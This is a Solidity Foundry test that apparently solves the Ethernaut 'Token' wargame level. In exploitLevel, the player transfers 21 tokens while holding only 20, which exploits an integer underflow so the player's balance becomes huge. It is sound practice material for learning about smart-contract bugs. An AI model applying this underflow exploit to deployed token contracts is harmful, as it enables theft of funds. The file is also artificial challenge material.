// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/Token.sol";
import "../src/levels/TokenFactory.sol";
import "./utils/BaseTest.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestToken is BaseTest{
    using SafeMath for uint256;
    Token level;


    constructor() public{
        levelFactory = new TokenFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance(true));
        level = Token(levelAddress);

        assertEq(level.totalSupply(),21000000);
        assertEq(level.balanceOf(player),20);
    }

    function exploitLevel() internal override{
        vm.startPrank(player);
        level.transfer(address(0x01),21);       
        vm.stopPrank();
    }
}